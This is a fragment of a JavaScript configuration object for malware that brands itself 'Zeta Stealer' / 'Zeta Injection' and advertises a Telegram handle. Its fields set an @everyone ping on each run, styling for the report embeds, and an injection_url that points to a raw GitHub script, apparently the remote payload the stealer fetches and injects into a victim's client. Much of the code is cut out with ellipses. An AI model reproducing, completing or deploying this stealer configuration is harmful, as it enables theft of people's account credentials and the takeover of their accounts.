...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Zeta Injection', 
  embed_icon: 'https://files.catbox.moe/qchinh.png?size=4096'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/zetastealer/zeta-injection/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: 'Zeta Stealer (t.me/zetastealer)',
        },
      },
    ],
  };
